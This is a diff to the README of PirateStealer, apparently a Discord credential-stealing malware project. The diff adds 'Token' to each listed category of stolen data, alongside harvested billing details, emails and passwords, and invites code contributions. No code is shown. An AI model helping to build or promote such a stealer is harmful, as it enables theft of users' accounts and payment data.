@@ -19,15 +19,19 @@ Official PirateStealer repos
     - City
     - ZIP Code
     - Address
+    - Token
 - Discord Login Stealing
     - Email
     - Password
+    - Token
 - Discord Change Password
     - Old Password
     - New Password
+    - Token
 - Discord Change Email
     - New Email
     - Password
+    - Token
 
 # How to contribute
 For contribute, make a [pull request](https://github.com/Stanley-GF/PirateStealer/pulls) or open an [issue](https://github.com/Stanley-GF/PirateStealer/issues) with your codes
